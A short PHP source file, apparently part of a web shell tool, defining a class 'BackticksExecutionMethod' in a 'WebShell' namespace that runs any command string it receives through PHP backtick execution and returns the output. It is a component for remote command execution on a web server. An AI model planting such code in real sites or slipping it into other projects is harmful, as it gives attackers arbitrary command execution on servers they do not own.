<?php
namespace WebShell;

class BackticksExecutionMethod implements ExecutionMethod
{
    public function execute(string $cmd): string
    {
        return `$cmd`;
    }
}
?>
